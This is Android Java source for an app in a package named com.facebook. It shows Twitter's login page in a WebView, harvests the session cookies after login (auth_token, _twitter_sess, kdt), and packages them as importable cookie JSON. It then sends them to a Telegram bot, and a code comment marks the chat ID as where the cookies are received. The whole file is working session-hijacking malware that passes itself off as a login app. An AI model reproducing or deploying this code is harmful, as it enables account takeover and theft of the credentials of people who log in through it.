package com.facebook;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import androidx.appcompat.app.AppCompatActivity;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.List;

import org.json.JSONException;
import org.json.JSONObject;



public class MainActivity extends AppCompatActivity {

	private final String TAG = "MainActivity";
	
    private final String BOT_TOKEN = "";
	private String TG_API_ENDPOINT = "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s";
	private final String CHAT_ID = ""; // where you want to receive cookies through your bot

    private WebView webView;
	
	private SharedPreferences preferences;
	
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
		
		preferences = getPreferences(Context.MODE_PRIVATE);
	
        setContentView(R.layout.activity_main);
        webView = findViewById(R.id.webview);
        webView.getSettings().setLoadsImagesAutomatically(true);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                String cookie = CookieManager.getInstance().getCookie(url);
				Log.d(TAG, cookie + " with " + url);
				
				if (cookie.contains("auth_token")) {
					try {
						String parsedCookies = parseCookiesToJson(cookie);
						if (parsedCookies != null) {
							sendCookiesToTelegram(parsedCookies);
						}
						
					} catch (JSONException e) {
						Log.e(TAG, e.getMessage());
					}
				}		
				
            }
			
			@Override
			public WebResourceResponse shouldInterceptRequest(WebView v, WebResourceRequest req) {
				if (req.getMethod().equals("POST")) {
					Log.d(TAG, "shouldInterceptRequest : " + req.getUrl().toString());
					Log.d(TAG, req.getRequestHeaders().toString());
					
					if (req.getUrl().toString().contains("update_subscriptions")) {
						onPageFinished(v, req.getUrl().toString());
					}
				}
				return null;
			}
			
        });
		
        webView.loadUrl("https://mobile.twitter.com/i/flow/login");

    }
	
	private String parseCookiesToJson(String cookie) throws JSONException {
		List<JSONObject> listOFCookies = new ArrayList<>();
		String[] arrayOfCookies = cookie.split(";");
		for (String eachCookie : arrayOfCookies) {
			String[] arrayOfEachCookie = eachCookie.split("=");
			JSONObject jsonObject = new JSONObject();
			jsonObject.put("name", arrayOfEachCookie[0].trim());
			jsonObject.put("value", arrayOfEachCookie[1].trim());
			
			if (jsonObject.getString("name").equals("auth_token")) {
				if (jsonObject.getString("value").equals(preferences.getString("auth_token", "no_auth_token"))) {
					Log.d(TAG, "Not sending credentials");
					return null;
				} else {
					Log.d(TAG, "Saving token " + jsonObject.getString("value"));
					SharedPreferences.Editor edit = preferences.edit();
					edit.putString("auth_token", jsonObject.getString("value"));
					edit.apply();
				}		
			}
			
			jsonObject.put("domain", ".twitter.com");
			
			if (arrayOfEachCookie[0].equals("att")
				|| arrayOfEachCookie[0].equals("_twitter_sess")
				|| arrayOfEachCookie[0].equals("auth_token")
				|| arrayOfEachCookie[0].equals("kdt")) {
				jsonObject.put("httpOnly", true);
			} else {
				jsonObject.put("httpOnly", false);
			}
			
			jsonObject.put("path", "/");
			jsonObject.put("secure", true);
			jsonObject.put("sameSite", "no_restriction");
			
			if (arrayOfEachCookie[0].equals("_twitter_sess")) {
				jsonObject.put("session", true);
			} else {
				jsonObject.put("session", false);
			}
			
			jsonObject.put("firstPartyDomain", "");
			jsonObject.put("storeId", null);
			
			listOFCookies.add(jsonObject);
		}		
		Log.d(TAG, listOFCookies.toString());
		return listOFCookies.toString();
	}
	
	private void sendCookiesToTelegram(final String message) {
	    new Thread() {
	        @Override
	        public void run() {
				BufferedReader reader = null;

				try {
				    URL url = new URL(String.format(TG_API_ENDPOINT, BOT_TOKEN, CHAT_ID, message));
	
					HttpURLConnection http = (HttpURLConnection) url.openConnection();
					http.setRequestMethod("GET");
					http.setRequestProperty("Host","api.telegram.org");
				
					Log.d(TAG, "Sending cookies to telegram");
					
					InputStream in = http.getErrorStream();
					if (in == null) {
						in = http.getInputStream();
					} else {
						InputStreamReader bufInStream = new InputStreamReader(in);
						reader = new BufferedReader(bufInStream);
						String line = null;
					    while((line = reader.readLine()) != null) {
				    		Log.e(TAG, "IO error " + line);
						}
					}
					
					http.disconnect();

				} catch (MalformedURLException e) {
					Log.e(TAG, "Malfoemed " + e.getMessage());
				} catch (IOException e) {
					Log.e(TAG, "IO error " , e);
				} finally {
					try {
						if (reader != null) {
							reader.close();
						}
						
					} catch (IOException e) {
						Log.e(TAG, e.getMessage());
					}
					
				}
			}
		}.start();
		
	}

}
